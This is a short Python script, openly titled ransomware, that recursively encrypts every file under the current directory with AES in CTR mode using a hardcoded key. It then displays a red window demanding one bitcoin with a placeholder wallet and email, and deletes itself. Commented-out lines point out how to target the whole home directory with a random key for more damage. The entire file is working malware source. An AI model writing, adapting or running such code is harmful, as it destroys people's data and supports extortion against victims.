#!/usr/bin/python3

import os
import pyaes
from tkinter import *

# be carefull while using this program and don't use in another person's computer!
# the 2 comments below can be used to cause more damage changing the files to encrypt and generating a random key
#home = os.path.expanduser('~')
#key = os.urandom(16)

key = b'0123456789ABCDEF'	# 16 bytes
aes = pyaes.AESModeOfOperationCTR(key)	# aes object to encrypt data

def encrypt_file(aes, file_name):
	with open(file_name, "rb") as f:
		content = f.read()
		encrypted_content = aes.encrypt(content)
		with open(file_name, "wb") as f:
			f.write(encrypted_content)


for currentpath, folders, files in os.walk('.'):	# lists the current directory and saves output
	for file in files:	# takes only the files, not the directories
		try:
			# concatenates the currentpath with the file name
        		encrypt_file(aes, os.path.join(currentpath, file))	
		except:
			continue

# message
root = Tk()
root.title("ransomware")
root.geometry("500x200")
root.configure(background='red')

main_text = Label(root, text="YOUR FILES ARE ENCRYPTED!")
main_text.grid(column=0, row=0, padx=10, pady=10)
sec_text = Label(root, text="SEND 1 BITCOIN TO XXXXXXXXXXXXXXXXXXXXX TO RECOVER THE FILES!")
sec_text.grid(column=0, row=1, padx=10, pady=10)
email_text = Label(root, text= "send confirmation to email@gmail.com to receive decrypter")
email_text.grid(column=0, row=2, padx=10, pady=10)
skull = Label(root, text=" ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎ ☠︎︎")
skull.grid(column=0, row=3, padx=10, pady=10)
root.mainloop()

os.remove("ransomware.py")
